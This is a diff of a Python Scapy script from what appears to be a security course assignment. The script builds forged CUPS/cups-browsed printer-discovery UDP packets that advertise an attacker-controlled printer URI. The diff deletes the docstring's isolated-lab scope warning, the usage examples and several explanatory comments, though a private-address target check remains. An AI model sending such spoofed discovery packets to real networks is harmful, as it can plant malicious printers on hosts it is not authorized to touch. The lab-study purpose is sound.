@@ -1,18 +1,5 @@
 #!/usr/bin/env python3
-"""
-cups_attack.py: DAT505 Assignment 2 (Task 2).
-
-Scapy-based tool to study insecure CUPS / cups-browsed printer discovery in an
-ISOLATED lab. It provides the plumbing (CLI, logging, UDP send, PCAP export)
-around the discovery packet you build yourself.
-
-Scope: isolated Docker containers / VMs only. Never send to a public,
-university, or third-party network.
-
-Usage examples:
-    sudo python3 cups_attack.py --target 172.18.0.2 --port 631 \
-        --printer-uri "ipp://192.0.2.10:6310/printers/evil" --pcap out.pcap
-    sudo python3 cups_attack.py --target 172.18.0.2 --count 3 --interval 1.0 -v
+"""Scapy CUPS / cups-browsed printer-discovery tool (DAT505 A2, Task 2)
 """
 import argparse
 import logging
@@ -31,7 +18,6 @@ except ImportError:
 log = logging.getLogger("cups_attack")
 
 
-# Safety guard: allow only private/loopback targets (lab), override required otherwise.
 def is_lab_target(ip: str) -> bool:
     import ipaddress
     try:
@@ -41,9 +27,8 @@ def is_lab_target(ip: str) -> bool:
     return addr.is_private or addr.is_loopback
 
 
-# Legacy CUPS browse datagram: "<type> <state> <uri> \"loc\" \"info\" \"model\"".
 def build_discovery_payload(args) -> bytes:
-    """Return the raw UDP payload advertising the attacker-controlled printer."""
+    """Build the browse datagram payload."""
     printer_type = "0x00"
     printer_state = "3"
 
@@ -79,7 +64,6 @@ def build_discovery_payload(args) -> bytes:
 
 
 def craft_packet(args, payload: bytes):
-    """Wrap the payload in IP/UDP toward the target."""
     return (
         IP(dst=args.target)
         / UDP(sport=args.sport, dport=args.port)
